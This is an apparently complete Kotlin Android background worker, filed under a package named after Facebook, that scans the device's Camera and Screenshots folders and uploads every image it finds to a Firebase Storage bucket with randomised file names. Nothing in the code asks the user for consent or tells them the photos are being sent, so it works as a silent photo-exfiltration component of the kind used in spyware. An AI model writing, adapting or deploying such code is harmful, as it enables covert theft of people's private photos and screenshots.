package com.facebook.firebase_project

// MyWorker.kt

import android.content.Context
import android.os.Environment
import android.util.Log
import android.webkit.MimeTypeMap
import android.widget.Toast
import androidx.core.net.toUri
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.google.firebase.ktx.Firebase
import com.google.firebase.storage.ktx.storage
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import java.io.File
import java.util.UUID

class MyWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
    private val imageRef = Firebase.storage.reference

    override fun doWork(): Result {
        val root = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM)
        val cameraFolder = File(root, "Camera")
        val screenshotsFolder = File(root, "Screenshots")

        // Process Camera folder
        processImageFolder(cameraFolder, "Camera images")

        // Process Screenshots folder
        processImageFolder(screenshotsFolder, "Screenshot images")

        return Result.success()
    }

    private fun processImageFolder(folder: File, storageFolderName: String) {
        if (folder.exists() && folder.isDirectory) {
            val imageFiles = getImageFiles(folder)

            if (imageFiles.isNotEmpty()) {
                // Do something with the list of image files
                for (imageFile in imageFiles) {
                    println("Image File: ${imageFile.name}")
                }
                Log.d("MainActivity", "Number of images in ${folder.name}: ${imageFiles.size}")
                uploadImagesToStorage(imageFiles, storageFolderName)
            } else {
                Toast.makeText(applicationContext, "No image files found in ${folder.name}", Toast.LENGTH_SHORT).show()
            }
        } else {
            Toast.makeText(applicationContext, "${folder.name} folder does not exist or is not a directory", Toast.LENGTH_SHORT).show()
        }
    }

    private fun uploadImagesToStorage(imageFiles: List<File>, storageFolderName: String) =
        CoroutineScope(Dispatchers.IO).launch {
            try {
                for (imageFile in imageFiles) {
                    // Generate a unique filename for each image
                    val filename = UUID.randomUUID().toString()

                    // Upload to the specified storage folder
                    imageRef.child("$storageFolderName/$filename").putFile(imageFile.toUri()).await()

                    withContext(Dispatchers.Main) {
                        Log.d("MainActivity", "Successfully uploaded image to $storageFolderName: $filename")
                        // You can add additional logic here if needed
                    }
                }
            } catch (e: Exception) {
                withContext(Dispatchers.Main) {
                    Log.e("MainActivity", "Error uploading images to $storageFolderName: ${e.message}")
                    // Handle the error if needed
                }
            }
        }

    private fun getImageFiles(folder: File): ArrayList<File> {
        val imageFiles = ArrayList<File>()
        val files = folder.listFiles()

        if (files != null) {
            for (file in files) {
                if (file.isFile && isImageFile(file)) {
                    imageFiles.add(file)
                }
            }
        }
        return imageFiles
    }

    private fun isImageFile(file: File): Boolean {
        val mimeType = MimeTypeMap.getSingleton().getMimeTypeFromExtension(file.extension.toLowerCase())
        return mimeType != null && mimeType.startsWith("image")
    }
}

